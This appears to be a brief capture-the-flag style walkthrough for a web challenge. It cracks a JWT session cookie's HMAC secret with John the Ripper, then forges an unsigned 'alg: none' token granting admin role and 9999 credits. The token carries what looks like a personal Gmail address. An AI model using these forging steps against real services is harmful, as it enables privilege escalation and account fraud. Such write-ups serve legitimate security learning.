Check the session cookie. It's JWT, so u can check the jwt.io website or others that work for u, first crack the jwt using john or hashcat.
```
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImRhd2lkLmtvd2Fsc2tpNjc4OUBnbWFpbC5jb20iLCJyb2xlIjoidXNlciIsImNyZWRpdHMiOjAsImlhdCI6MTc3MTM0NzgxNywidGhlbWUiOiJ2YWxlbnRpbmUifQ.BUy1NSgzyswAy0mfrkIb7l4E5bJnGQv1aP_TfYdlpbY" > jwt.txt

```

```
john jwt.txt --format=HMAC-SHA256
```



Forge the JWT token:

```
{
  "alg": "none",
  "typ": "JWT"
}
```

```
{
  "email": "dawid.kowalski6789@gmail.com",
  "role": "admin",
  "credits": 9999,
  "iat": 1771347817,
  "theme": "valentine"
}
```

